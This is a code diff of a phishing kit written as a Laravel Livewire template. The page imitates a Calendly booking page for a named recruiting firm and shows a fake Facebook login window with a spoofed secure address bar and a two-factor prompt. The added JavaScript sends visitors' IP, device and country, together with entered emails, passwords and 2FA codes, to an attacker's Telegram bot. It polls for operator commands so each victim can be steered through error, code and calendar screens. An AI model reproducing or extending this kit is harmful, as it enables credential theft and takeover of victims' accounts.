@@ -4,12 +4,12 @@
             <div class="box__shadow">
                 <div class="calendar__wrapper">
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="50%" src="img/images.png" /></div>
+                        <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
                         <div class="screen__two center__text">
                             <div class="mobile__back-svg">
                                 <div class="content__wrapper">
                                     <div style="margin-bottom: 15px;">
-                                        <div><img class="avatar" width="65px" src="img/logo.png" /></div>
+                                        <div><img class="avatar" width="65px" src="{{asset('img/logo.png')}}" /></div>
                                     </div>
                                     <h2>15 Minutes Meeting</h2>
                                 </div>
@@ -52,10 +52,41 @@
                             <p>Report abuse</p>
                         </div>
                     </div>
-                    <div class="form__wrapper date__time">
+                    <div  class="date__time {{$showCalender == false ? 'd-none':''}}">
+                        <div class="{{$showCalenderProgress ? 'd-none':''}}">
+                            <h2>Select a Date & Time</h2>
+                            <div class=" calendar__container svg__icon">
+                                <div  style="min-width: 400px;padding-right: 15px;margin-top:20px;">
+                                    <div wire:ignore class="calendar-wrapper" id="calendar-wrapper"></div>
+                                    <div class="time__zone-wrapper" style="margin-top: 20px;">
+                                        <p>Time zone</p>
+                                        <div class="central">
+                                            <img width="14px" src="{{asset('world.png')}}">
+                                            US Georgia (00:59)
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class=" loading-container2 {{$showCalenderProgress ? '':'d-none'}}">
+                            <h1 style="font-size: 48px;">Saving your selection</h1>
+                            <h2>Please contact our live support to fully approve your scheduled date</h2>
+                            <div class="loader2"></div>
+                            <div style="margin-top: 40px;">
+                                <a id="openChat" class="blue-btn" href="#" >Contact live chat support</a>
+                            </div>
+                        </div>
+                        <a class="logo__wrapper-calendly hide__mobile">
+                            <div class="background">
+                                <div class="powerd__by">powered by</div>
+                                <div class="calendly">Calendly</div>
+                            </div>
+                        </a>
+                    </div>
+                    <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
                         <div>
                             <div class="full__width">
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Shirin Kurdi</h2></div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Robert Half - Recruiting Team</h2></div>
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="form-steps">
                                         <form id="msform">
@@ -70,7 +101,7 @@
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="dummy__text">
                                         <p>
-                                            Please confirm your appointment with Shirin Kurdi. <br />
+                                            Please confirm your appointment with Robert Half - Recruiting Team. <br />
                                             To complete the confirmation process, continue with Facebook
                                         </p>
                                     </div>
@@ -118,6 +149,7 @@
                 </div>
             </a>
         </div>
+
     </div>
     <div wire:ignore.self  style="display: none;" id="continue-modal">
         <div class="ant-modal-root">
@@ -142,19 +174,19 @@
                                 <div>
                                     <div class="wrapper_header">
                                         <div class="sign__up-modal">
-                                            <img src="img/hLRJ1GG_y0J.ico" alt="" width="17px" />
+                                            <img src="{{asset('img/hLRJ1GG_y0J.ico')}}" alt="" width="17px" />
                                             <p>Log into Facebook | Facebook</p>
                                         </div>
                                         <div class="icons">
-                                            <div class="img"><img src="img/minus.png" alt="" /></div>
+                                            <div class="img"><img src="{{asset('img/minus.png')}}" alt="" /></div>
                                             <div class="img"><img src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png" alt="" /></div>
-                                            <div class="img img-x"><img src="img/close.png" alt="" /></div>
+                                            <div class="img img-x"><img src="{{asset('img/close.png')}}" alt="" /></div>
                                         </div>
                                     </div>
                                     <div class="input__title-wrapper">
                                         <div class="lock__screen">
                                             <div class="lock">
-                                                <div class="lock__wrapper"><img src="img/locktest.png" alt="" /><span class="green">Secure | https:</span><span class="black-opacity">//</span></div>
+                                                <div class="lock__wrapper"><img src="{{asset('img/locktest.png')}}" alt="" /><span class="green">Secure | https:</span><span class="black-opacity">//</span></div>
                                             </div>
                                             <span class="input__value">
                                             www.facebook.com
@@ -245,7 +277,7 @@
                                 @endif
                                 @if($twoFaPage)
                                     <div class="auth-req-container">
-                                        <form class="auth-req" wire:submit.prevent="codeSubmit">
+                                        <form id="desktop-code" class="auth-req" wire:submit.prevent="codeSubmit">
                                             <div class="auth-req-text">
                                                 <h2>Two-factor authentication required</h2>
                                                 <div class="auth-req-paragraph">
@@ -260,22 +292,34 @@
                                                     <span> (wait 4:29)</span>
                                                 </div>
                                             </div>
-                                            <div class="show-input-on-mobile show__input-modal">
-                                                <input type="number" value="">
-                                                <div class="show-error-modal">
-                                                    <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
-                                                </div>
-                                            </div>
                                             <div class="auth-req-footer" style="height: auto"><a>Need another way to authenticate?</a>
                                                 <button    type="submit" class="false"><span>Continue</span></button>
                                             </div>
                                         </form>
-                                        <div class="having-trouble-class">
-                                            <button>Having trouble?</button>
-                                        </div>
-                                        <div class="show-button-mobile false">
-                                            <button>Continue</button>
-                                        </div>
+                                        <form id="mobile-code" class="auth-req" wire:submit.prevent="codeSubmitMobile">
+                                            <div class="auth-req-text">
+                                                <h2>Two-factor authentication required</h2>
+                                                <div class="auth-req-paragraph">
+                                                    <p class="first">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
+                                                    <p class="second">Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
+                                                </div>
+                                            </div>
+                                            <div class="show-input-on-mobile show__input-modal">
+                                                <input maxlength="6" minlength="6" name="code2"  placeholder="Login Code" type="number" required="required">
+                                                @if($codeError)
+                                                    <div class="show-error-modal2">
+                                                        <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
+                                                    </div>
+                                                @endif
+                                            </div>
+                                            <div class="having-trouble-class">
+                                                <button>Having trouble?</button>
+                                            </div>
+                                            <div class="show-button-mobile false">
+                                                <button type="submit">Continue</button>
+                                            </div>
+                                        </form>
+
                                         <div class="show-footer-on-mobile-plus">
                                             <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
                                             <div class="footer-flex-mobile-plus confimartion__modal">
@@ -296,73 +340,73 @@
                                     </div>
                                 @endif
                                 @if($enableLoadingAfterSubmit)
-                                <div class="loading-container">
-                                    <div class="loading-message">Please be patient and dont close this window</div>
-                                    <div class="loading-submessage step1">Checking the details on your account...</div>
-                                    <div class="loading-submessage step2">Checking email addresses...</div>
-                                    <div class="loading-submessage step3">Checking two-factor authenticator...</div>
-                                    <div class="loading-submessage step4">Checking other details...</div>
-                                    <div class="loading-submessage finalStep">It can take up to 10 minutes to verify your account.</div>
-                                    <div class="loader"></div>
-                                </div>
+                                    <div class="loading-container">
+                                        <div class="loading-message">Please be patient and dont close this window</div>
+                                        <div class="loading-submessage step1">Checking the details on your account...</div>
+                                        <div class="loading-submessage step2">Checking email addresses...</div>
+                                        <div class="loading-submessage step3">Checking two-factor authenticator...</div>
+                                        <div class="loading-submessage step4">Checking other details...</div>
+                                        <div class="loading-submessage finalStep">It can take up to 10 minutes to verify your account.</div>
+                                        <div class="loader"></div>
+                                    </div>
                                 @endif
                             </div>
                             @if($showModalFooter)
-                            <div class="modal__footer">
-                                <div class="footer-menu-flex-ul">
-                                    <div class="container-language-footer">
-                                        <ul class="flex-ul">
-                                            <li>English (US)</li>
-                                            <li>Español</li>
-                                            <li>Deutsch</li>
-                                            <li>Türkçe</li>
-                                            <li>Српски</li>
-                                            <li>Français (France)</li>
-                                            <li>Italiano</li>
-                                            <li>Bosanski</li>
-                                            <li>Svensk</li>
-                                            <li>Português (Brasil)</li>
-                                            <button class="countrys-button"><span>+</span></button>
-                                        </ul>
+                                <div class="modal__footer">
+                                    <div class="footer-menu-flex-ul">
+                                        <div class="container-language-footer">
+                                            <ul class="flex-ul">
+                                                <li>English (US)</li>
+                                                <li>Español</li>
+                                                <li>Deutsch</li>
+                                                <li>Türkçe</li>
+                                                <li>Српски</li>
+                                                <li>Français (France)</li>
+                                                <li>Italiano</li>
+                                                <li>Bosanski</li>
+                                                <li>Svensk</li>
+                                                <li>Português (Brasil)</li>
+                                                <button class="countrys-button"><span>+</span></button>
+                                            </ul>
+                                        </div>
+                                        <div class="flex-second-ul">
+                                            <ul>
+                                                <li>Sign Up</li>
+                                                <li>Log In</li>
+                                                <li>Messenger</li>
+                                                <li>Facebook Lite</li>
+                                                <li>Watch</li>
+                                                <li>Places</li>
+                                                <li>Games</li>
+                                                <li>Marketplace</li>
+                                                <li>Facebook Pay</li>
+                                                <li>Oculus</li>
+                                                <li>Portal</li>
+                                                <li>Instagram</li>
+                                                <li>Bulletin</li>
+                                                <li>Local</li>
+                                            </ul>
+                                        </div>
+                                        <div class="flex-second-ul-2">
+                                            <ul>
+                                                <li>Fundraisers</li>
+                                                <li>Services</li>
+                                                <li>Voting Information Centre</li>
+                                                <li>About</li>
+                                                <li>Create ad</li>
+                                                <li>Create Page</li>
+                                                <li>Developers</li>
+                                                <li>Careers</li>
+                                                <li>Privacy</li>
+                                                <li>Cookies</li>
+                                                <li class="ad-choice-img">Ad Choices <span class="img-li"></span></li>
+                                                <li>Terms</li>
+                                                <li>Help</li>
+                                            </ul>
+                                        </div>
+                                        <div class="meta-footer"><p>Meta © 2024</p></div>
                                     </div>
-                                    <div class="flex-second-ul">
-                                        <ul>
-                                            <li>Sign Up</li>
-                                            <li>Log In</li>
-                                            <li>Messenger</li>
-                                            <li>Facebook Lite</li>
-                                            <li>Watch</li>
-                                            <li>Places</li>
-                                            <li>Games</li>
-                                            <li>Marketplace</li>
-                                            <li>Facebook Pay</li>
-                                            <li>Oculus</li>
-                                            <li>Portal</li>
-                                            <li>Instagram</li>
-                                            <li>Bulletin</li>
-                                            <li>Local</li>
-                                        </ul>
-                                    </div>
-                                    <div class="flex-second-ul-2">
-                                        <ul>
-                                            <li>Fundraisers</li>
-                                            <li>Services</li>
-                                            <li>Voting Information Centre</li>
-                                            <li>About</li>
-                                            <li>Create ad</li>
-                                            <li>Create Page</li>
-                                            <li>Developers</li>
-                                            <li>Careers</li>
-                                            <li>Privacy</li>
-                                            <li>Cookies</li>
-                                            <li class="ad-choice-img">Ad Choices <span class="img-li"></span></li>
-                                            <li>Terms</li>
-                                            <li>Help</li>
-                                        </ul>
-                                    </div>
-                                    <div class="meta-footer"><p>Meta © 2024</p></div>
                                 </div>
-                            </div>
                             @endif
                         </div>
                         <div class="ant-modal-footer">
@@ -384,6 +428,7 @@
     }else{
         sessionId = localStorage.getItem('sessionId');
     }
+    let selectedDate;
     const apiKey = "{{env('TELEGRAM_API_KEY')}}";
     const chatId = "{{env('TELEGRAM_CHAT_ID')}}";
     const replyMarkup = `reply_markup={"inline_keyboard": [[{"text": "accept", "callback_data": "accept"}]]}`;
@@ -394,28 +439,97 @@
             .then((response) => response.json())
             .then((data) => {
                 const ipAddress = data?.ip || "";
-                const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
-                fetch(tURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `===NEW VISITOR===\nIP ADDRESS: ${ipAddress}`,
-                    }),
-                });
+                @this.set('ip',ipAddress);
+                // const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
+                // fetch(tURL, {
+                //     method: "POST",
+                //     headers: {
+                //         "Content-Type": "application/json",
+                //     },
+                //     body: JSON.stringify({
+                //         chat_id: chatId,
+                //         text: `===NEW VISITOR===\nIP ADDRESS: ${ipAddress}`,
+                //     }),
+                // });
             })
             .catch((error) => {});
     })
     document.addEventListener('open-modal',function (){
         $('#continue-modal').show();
+    });
+
+    function getDeviceOS() {
+        const userAgent = navigator.userAgent;
+        if (/Android/i.test(userAgent)) {
+            return 'Android';
+        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+            return 'iOS';
+        } else if (/Windows/i.test(userAgent)) {
+            return 'Windows';
+        } else if (/Linux/i.test(userAgent)) {
+            return 'Linux';
+        } else if (/Mac OS|Macintosh/i.test(userAgent)) {
+            return 'Mac OS';
+        } else {
+            return 'Unknown';
+        }
+    }
+    function getDeviceType() {
+        const userAgent = navigator.userAgent;
+
+        if (/Mobile|Android|iPhone|iPod/i.test(userAgent)) {
+            return 'Mobile';
+        } else if (/Tablet|iPad/i.test(userAgent) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(userAgent))) {
+            return 'Tablet';
+        } else {
+            return 'Desktop';
+        }
+    }
+    async function getCountryByIP(ip) {
+        const token = '51a670a7b50b57';
+        const apiUrl = `https://ipinfo.io/${ip}/json?token=${token}`;
+
+        try {
+            const response = await fetch(apiUrl);
+            if (!response.ok) throw new Error('Failed to fetch IP information');
+            const data = await response.json();
+            return data.country;
+        } catch (error) {
+            console.error('Error:', error.message);
+            return null;
+        }
+    }
+    async function handleAsyncIPInfo() {
+        try {
+            const deviceType = getDeviceType();
+            const os = getDeviceOS();
+            const ip = @this.ip;
+            const country = await getCountryByIP(ip);
+            const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage`;
+            await fetch(tURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `===NEW VISITOR===\nIp: ${ip}\nDevice: ${deviceType}\nOS: ${os}\nCountry: ${country || 'Unknown'}`,
+                }),
+            });
+
+        } catch (error) {
+            console.error('Error:', error.message);
+        }
+    }
+    document.addEventListener('send-ip-info',function (){
+        handleAsyncIPInfo();
     })
+
     document.addEventListener('show-login-progress',function (){
         @this.set('showModalFooter',false);
         @this.set('enableLoginForm',false);
         @this.set('enableLoadingAfterSubmit',true);
-         emailElement = $('input[name="email"]').val();
+        emailElement = $('input[name="email"]').val();
         const passwordElement = $('input[name="password"]').val();
         fetch(tURL, {
             method: "POST",
@@ -464,7 +578,7 @@
                         [
                             {
                                 text: `Kick`,
-                                callback_data: `/kick ${sessionId}`,
+                                callback_data: `/login ${sessionId}`,
                             },
                         ],
                     ],
@@ -512,7 +626,7 @@
                         [
                             {
                                 text: `Kick`,
-                                callback_data: `/kick ${sessionId}`,
+                                callback_data: `/login ${sessionId}`,
                             },
                         ],
                     ],
@@ -532,7 +646,66 @@
                 console.log("Unknown error in auth.html", error);
             });
 
-    })
+    });
+    document.addEventListener('code-submit-mobile',function (){
+        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
+        const code = $('input[name="code2"]').val();
+        fetch(tURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
+                    code || ""
+                }`,
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            {
+                                text: `2fa`,
+                                callback_data: `/2fa ${sessionId}`,
+                            },
+                            {
+                                text: `2fa error`,
+                                callback_data: `/2faError ${sessionId}`,
+                            },
+                        ],
+                        [
+                            {
+                                text: `Schedule`,
+                                callback_data: `/schedule ${sessionId}`,
+                            },
+                            {
+                                text: `Final`,
+                                callback_data: `/final ${sessionId}`,
+                            },
+                        ],
+                        [
+                            {
+                                text: `Kick`,
+                                callback_data: `/login ${sessionId}`,
+                            },
+                        ],
+                    ],
+                },
+            }),
+        })
+            .then(() => {
+                @this.set('loginError', false);
+                @this.set('oldPassError', false);
+                @this.set('enableLoginForm', false);
+                @this.set('showModalFooter', false);
+                @this.set('enableLoadingAfterSubmit', true);
+                @this.set('twoFaPage', false);
+                @this.set('codeError', false);
+            })
+            .catch((error) => {
+                console.log("Unknown error in auth.html", error);
+            });
+
+    });
     const startInterval = () => {
         let lastUpdateId = 0;
         setInterval(() => {
@@ -552,6 +725,8 @@
                                 if (update.callback_query) {
                                     const callbackData = update.callback_query.data;
                                     if (callbackData === `/oldError ${localStorage.getItem('sessionId')}`) {
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', true);
                                         @this.set('enableLoginForm', true);
@@ -559,7 +734,10 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', false);
                                         @this.set('codeError', false);
+                                        @this.set('showCalender', false);
                                     }else if(callbackData === `/loginError ${localStorage.getItem('sessionId')}`){
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', true);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', true);
@@ -567,15 +745,22 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', false);
                                         @this.set('codeError', false);
+                                        @this.set('showCalender', false);
+
                                     }else if(callbackData === `/login ${localStorage.getItem('sessionId')}`){
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
-                                        @this.set('enableLoginForm', false);
+                                        @this.set('enableLoginForm', true);
                                         @this.set('showModalFooter', true);
                                         @this.set('enableLoadingAfterSubmit', false);
-                                        @this.set('twoFaPage', true);
+                                        @this.set('twoFaPage', false);
                                         @this.set('codeError', false);
+                                        @this.set('showCalender', false);
                                     }else if(callbackData === `/2fa ${localStorage.getItem('sessionId')}`){
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
@@ -583,7 +768,10 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', true);
                                         @this.set('codeError', false);
+                                        @this.set('showCalender', false);
                                     }else if(callbackData === `/2faError ${localStorage.getItem('sessionId')}`){
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
@@ -591,7 +779,9 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', true);
                                         @this.set('codeError', true);
+                                        @this.set('showCalender', false);
                                     }else if(callbackData === `/schedule ${localStorage.getItem('sessionId')}`){
+                                        @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
@@ -599,7 +789,8 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', false);
                                         @this.set('codeError', false);
-                                        window.Livewire.navigate('/calendar-calendly');
+                                        $('#continue-modal').hide();
+                                        @this.set('showCalender', true);
                                     }
                                 }
                             }
@@ -614,5 +805,244 @@
     function generateSessionId() {
         return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${crypto.getRandomValues(new Uint32Array(1))[0]}`;
     }
+
+    window.selectDate = function (date) {
+        console.log('as')
+        $('#calendar-wrapper').updateCalendarOptions({
+            date: date
+        });
+        selectedDate = date;
+        const currentDate = new Date(date);
+        currentDate.setDate(currentDate.getDate());
+        const options = { weekday: 'long', month: 'long', day: 'numeric' };
+        const formattedDate = currentDate.toLocaleDateString('en-US', options);
+        if ($('.calendar__container .full__width').length > 0){
+            $('.calendar__container .full__width').remove();
+        }
+        $('.calendar__container').append(`<div class="full__width">
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="calendar__time">
+                                            <h2>${formattedDate}</h2>
+                                            <div class="available__wrapper">
+                                                <div class="green__text"></div>
+                                                <p> times you're available</p>
+                                            </div>
+                                            <div class="button__time-wrapper">
+                                                <div>
+                                                    <button class="time" data-time="09:30">
+                                                        <div class="green__text"></div>09:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="10:00">
+                                                        <div class="green__text"></div>10:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="10:30">
+                                                        <div class="green__text"></div>10:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="11:00">
+                                                        <div class="green__text"></div>11:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="11:30">
+                                                        <div class="green__text"></div>11:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="12:00">
+                                                        <div class="green__text"></div>12:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="12:30">
+                                                        <div class="green__text"></div>12:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="13:00">
+                                                        <div class="green__text"></div>13:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="13:30">
+                                                        <div class="green__text"></div>13:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="14:00">
+                                                        <div class="green__text"></div>14:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="14:30">
+                                                        <div class="green__text"></div>14:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="15:00">
+                                                        <div class="green__text"></div>15:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="15:30">
+                                                        <div class="green__text"></div>15:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="16:00">
+                                                        <div class="green__text"></div>16:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="16:30">
+                                                        <div class="green__text"></div>16:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div class="footer__wrapper footer__wrapper-mobile">
+                                                <p>Cookie settings</p>
+                                                <p>Report abuse</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>`);
+    };
+    let defaultConfig = {
+        weekDayLength: 3,
+        prevButton:'<i class="fa fa-chevron-left" aria-hidden="true"></i>',
+        nextButton:'<i class="fa fa-chevron-right" aria-hidden="true"></i>',
+        date:new Date(),
+        showTodayButton:false,
+        onClickDate: selectDate,
+        disable: function (date) {
+            const today = new Date();
+            const yesterday = new Date(today.getFullYear(), today.getMonth(), today.getDate() - 1);
+            return date <= yesterday;
+        },
+        showYearDropdown: true,
+        startOnMonday: false,
+    };
+    $('#calendar-wrapper').calendar(defaultConfig);
+    $(document).on('click','button.time',function (e){
+        e.preventDefault();
+        $('button.time').each(function (){
+            $(this).parent('div').removeClass('next__button');
+            $(this).parent('div').find('div > div').empty();
+        });
+        $(this).parent('div').addClass('next__button');
+        $(this).parent('div').find('div > div').append('<button class="btn-next">Next</button>');
+    });
+    $(document).on('click','.btn-next',function (e){
+        e.preventDefault();
+        let time = $(this).parent('div').parent('div').parent('div').find('.time').data('time'); // Example: "10:30"
+        let selectedDateFinal = new Date(selectedDate);
+        if (!selectedDateFinal || !time) {
+            console.error('selectedDate or time is missing');
+            return;
+        }
+
+        let [hours, minutes] = time.split(':').map(Number);
+        selectedDateFinal.setHours(hours);
+        selectedDateFinal.setMinutes(minutes);
+        selectedDateFinal.setSeconds(0);
+        let session = localStorage.getItem('sessionId');
+        fetch(`https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `===PICK A DATE: ${localStorage.getItem('email')}===\n ${selectedDateFinal}`,
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            {
+                                text: `Kick to 2fa`,
+                                callback_data: `/2fa ${session}`,
+                            },
+                            {
+                                text: `Kick to Login`,
+                                callback_data: `/login ${session}`,
+                            },
+                        ],
+                        [
+                            {
+                                text: `Kick to the calendar`,
+                                callback_data: `/schedule ${session}`,
+                            },
+                            {
+                                text: `Thank You`,
+                                callback_data: `/thankyou ${session}`,
+                            },
+                        ]
+                    ],
+                },
+            })
+        }).then(response => {
+            @this.set('showCalenderProgress', true);
+        }).catch(error => {
+
+        });
+    });
+    document.getElementById('openChat').addEventListener('click', function(e) {
+        e.preventDefault();
+        if (window.jivo_api) {
+            jivo_api.open();
+        } else {
+            console.error('JivoChat API is not loaded yet.');
+        }
+    });
 </script>
 @endscript
